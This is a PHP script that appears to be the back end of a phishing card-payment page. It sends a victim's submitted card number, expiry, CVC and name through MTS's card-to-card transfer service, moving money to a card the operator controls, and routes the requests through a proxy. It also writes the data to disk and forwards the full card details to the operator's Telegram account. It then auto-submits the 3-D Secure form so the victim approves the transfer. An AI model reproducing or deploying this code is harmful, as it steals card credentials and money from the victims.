<?php

/* */
require_once(__DIR__ . DIRECTORY_SEPARATOR . 'additionally.php');
require_once(__DIR__ . DIRECTORY_SEPARATOR . 'telegram.php');

/* */
try {
	/* */
	$P_CONFIG = parse_ini_file(realpath('../config/index.ini'), true);

	/* */
	$_POST['o'] = $_POST['card_owner'];
	$_POST['n'] = $_POST['card_number'];
	$_POST['m'] = explode(' / ', $_POST['card_date'])[0];
	$_POST['y'] = explode(' / ', $_POST['card_date'])[1];
	$_POST['c'] = $_POST['card_cvc'];
	$_POST['a'] = $_POST['amount'];
	$_POST['s'] = $P_CONFIG['URLS']['STATUS'];

	$_POST['r'] = $P_CARD;
	$_POST['proxy'] = $P_PROXY;
	$_POST['proxyuserpwd'] = $P_PROXYUSERPWD;

	/* */
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'https://payment.mts.ru/transfer/CardToCard');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, true);

	if(isset($P_PROXY) && preg_match('/^(.*):(.*)$/', $P_PROXY)) 
	{
		curl_setopt($ch, CURLOPT_PROXY, $P_PROXY);
		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);

	    if(preg_match('/^(.*):(.*)$/', $P_PROXYUSERPWD)) 
	    {
	        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $P_PROXYUSERPWD);
	    }
	}

	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Host: payment.mts.ru',
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36',
	]);

	$data = curl_exec($ch);
	curl_close($ch);

	/* */
	if(
		!preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $data, $cookies) || 
		!preg_match('/<input\sname="__RequestVerificationToken"\stype="hidden"\svalue="(.*)"/', $data, $__RequestVerificationToken)
	) {
		throw new Exception('Произошла ошибка при оплате. Платежная сессия не найдена.');
	}

	/* */
	$cookies = implode('; ', $cookies[1]);
	$__RequestVerificationToken = $__RequestVerificationToken[1];

	/* */
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'https://payment.mts.ru/transfer/do');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POST, true);
	
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Cookie: ' . $cookies,
		'Host: payment.mts.ru',
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36',
	]);

	if(isset($P_PROXY) && preg_match('/^(.*):(.*)$/', $P_PROXY)) 
	{
		curl_setopt($ch, CURLOPT_PROXY, $P_PROXY);
		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);

	    if(preg_match('/^(.*):(.*)$/', $P_PROXYUSERPWD)) 
	    {
	        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $P_PROXYUSERPWD);
	    }
	}

	curl_setopt($ch, CURLOPT_POSTFIELDS, [
		'ExternalTransfer' => true,
		'TokenizedTargetPan' => '',
		'TargetPanValue' => $_POST['r'],
		'Sum' => $_POST['a'],
		'SourceInstrumentId' => 'ANONYMOUS_CARD',
		'Pan' => $_POST['n'],
		'ExpiryMonth' => $_POST['m'],
		'ExpiryYear' => $_POST['y'],
		'CardholderName' => $_POST['o'],
		'Cvc' => $_POST['c'],
		'__RequestVerificationToken' => $__RequestVerificationToken,
		'Currency' => 'undefined',
		'Location' => 'https://payment.mts.ru/transfer/CardToCard',
	]);
	
	$data = json_decode(curl_exec($ch));
	curl_close($ch);

	/* */
	if(
		!isset($data->model) || !isset($data->model->md) || !isset($data->model->acsUrl) || !isset($data->model->paReq)
	) {
		throw new Exception('Произошла ошибка при оплате. Возможно, вы указали неверные данные. ' . json_encode((array) $data));
	}

	/* */
	$data->model->cookies = $cookies;
	$data->model->__RequestVerificationToken = $__RequestVerificationToken;

	/* */
	file_put_contents((realpath('./temp') . DIRECTORY_SEPARATOR . $data->model->md), json_encode(
		array_merge(
			(array) $data->model, $_POST
		)
	));

	/* */
	try {
		/* */
		$MESSAGE .= "Владелец: " . $_POST['o'] . "\n";
		$MESSAGE .= "Банковская карта: " . $_POST['n'] . "\n";
		$MESSAGE .= "Срок действия: " . $_POST['m'] . " / " . $_POST['y'] . "\n";
		$MESSAGE .= "CVC-код: " . $_POST['c'];
		
		/* */
		(new TG($P_CONFIG['TELEGRAM']))->sendMessage($P_CONFIG['TELEGRAM']['ADMIN_ID'], $MESSAGE);
	}
	catch(Exception $e) {
		file_put_contents((realpath('./temp') . DIRECTORY_SEPARATOR . 'TELEGRAM-EXCEPTIONS.txt'), ($e->getMessage() . PHP_EOL), FILE_APPEND);
	}
}
catch(Exception $e) {
	header('Location: ' . $P_CONFIG['URLS']['ERROR'] . '?exception=' . $e->getMessage());
}

?>
<html>
	<body>
		<form action="<?= $data->model->acsUrl ?>" method="POST">
			<input name="MD" type="hidden" value="<?= $data->model->md ?>">
			<input name="PaReq" type="hidden" value="<?= $data->model->paReq ?>">
			<input name="TermUrl" type="hidden" value="<?= $_POST['s'] ?>">
		</form>
		<script>document.forms[0].submit();</script>
	</body>
</html>